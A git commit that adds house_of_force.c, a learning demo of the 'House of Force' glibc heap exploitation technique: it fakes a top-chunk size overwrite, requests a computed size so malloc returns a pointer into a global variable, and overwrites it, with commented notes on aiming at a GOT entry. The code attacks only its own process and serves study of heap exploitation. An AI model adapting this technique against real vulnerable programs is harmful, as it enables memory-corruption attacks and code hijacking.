e857eb9d50c07d14efdc1041bf0cde5c5eec95dd
physicszq <80090955+physicszq@users.noreply.github.com>
2023-06-06 22:37:19 +0800

    Create house_of_force.c

---
+++ house_of_force.c
@@ -0,0 +1,67 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <malloc.h>
+#include <assert.h>
+
+//这个案例的主要思想并没有完全搞懂，通过指针把top chunk 的size的值改成最大值。再设置好下一次分配的内存大小，使得之后的内存分配从数据段变量bss_var处开始分配。
+char bss_var[] = "This is a string that we want to overwrite.";
+
+int main(int argc , char* argv[])
+{
+
+	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
+	intptr_t *p1 = malloc(256);
+	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);
+
+	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
+	int real_size = malloc_usable_size(p1);
+	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);
+
+	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
+
+	//----- VULNERABILITY ----
+	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
+	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);
+
+	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
+	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
+	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+	//------------------------
+
+	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
+	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
+	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
+	void *new_ptr = malloc(evil_size);
+	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
+
+	void* ctr_chunk = malloc(100);
+	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
+	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
+	fprintf(stderr, "Now, we can finally overwrite that value:\n");
+
+	fprintf(stderr, "... old string: %s\n", bss_var);
+	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
+	strcpy(ctr_chunk, "YEAH!!!");
+	fprintf(stderr, "... new string: %s\n", bss_var);
+
+	assert(ctr_chunk == bss_var);
+
+
+	// some further discussion:
+	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
+	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
+	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
+	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
+	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
+	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
+	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");
+
+	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
+	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);
+
+	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
+}
